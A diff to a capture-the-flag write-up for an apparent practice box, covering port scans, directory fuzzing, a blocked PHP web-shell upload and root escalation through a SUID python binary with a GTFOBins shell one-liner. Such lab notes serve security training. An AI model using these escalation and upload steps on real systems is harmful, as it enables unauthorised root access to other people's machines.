@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 2. 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
@@ -16,14 +16,17 @@
    - server - Apache/2.4.29
    - title - HackIT - Home
 
-- fuzzing http
+### http
 
 ```sh
 $ ffuf -u http://$IP/FUZZ -e php -w /usr/share/wordlists/common.txt
 ```
 
 - found `panel`, `css`, `js`, `uploads`
-- try to upload shell.php and no php allowed
+
+## User Access
+
+- at `uploads` directory, try to upload shell.php and no php allowed
 
 ![](images/2023-03-02-18-58-15.png)
 
@@ -39,9 +42,11 @@ $ ffuf -u http://$IP/FUZZ -e php -w /usr/share/wordlists/common.txt
 1. Vulnerable to CVE-2021-4034
 2. suid
 -rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
-3. sgid
+1. sgid
 -rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
 ```
+
+## Root Access
 
 - find python in gtfobins for suid
 
@@ -49,7 +54,6 @@ $ ffuf -u http://$IP/FUZZ -e php -w /usr/share/wordlists/common.txt
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-- get root access
 
 ```sh
 $ whoami
